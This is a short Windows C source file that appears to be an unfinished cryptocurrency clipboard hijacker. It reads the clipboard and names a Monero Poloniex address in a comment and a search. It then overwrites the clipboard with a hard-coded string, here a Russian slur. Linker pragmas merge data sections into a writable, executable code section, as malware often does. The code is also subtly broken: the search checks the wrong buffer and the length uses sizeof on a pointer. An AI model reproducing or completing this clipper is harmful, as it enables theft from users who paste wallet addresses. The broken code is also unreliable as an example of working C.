#include <windows.h>
#include <shlwapi.h>

#pragma comment(linker, "/MERGE:.data=.text")
#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/SECTION:.text,EWR")

#pragma comment (lib, "shlwapi.lib")

void ChangeClipboard(wchar_t*str, int n)
{
	size_t len, i;
	HGLOBAL hMem;
	UINT uFormat;
	len = (n + 1)*(sizeof(wchar_t));
	hMem = GlobalAlloc(GMEM_MOVEABLE, len);
	memcpy(GlobalLock(hMem), str, len);
	GlobalUnlock(hMem);
	OpenClipboard(0);
	EmptyClipboard();
	uFormat = CF_TEXT;
	SetClipboardData(uFormat, hMem);
	CloseClipboard();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HANDLE clip;
	char* monero_poloniex = "you pidor";
	char* pch;

	if (OpenClipboard(NULL)) {
		clip = GetClipboardData(CF_TEXT);
		CloseClipboard();
	}

	// 4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk monero poloniex
	pch = strstr(monero_poloniex, "4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk");

	if (!pch)
	{
		ChangeClipboard(monero_poloniex, sizeof(monero_poloniex));
	}

	ExitProcess(0);
}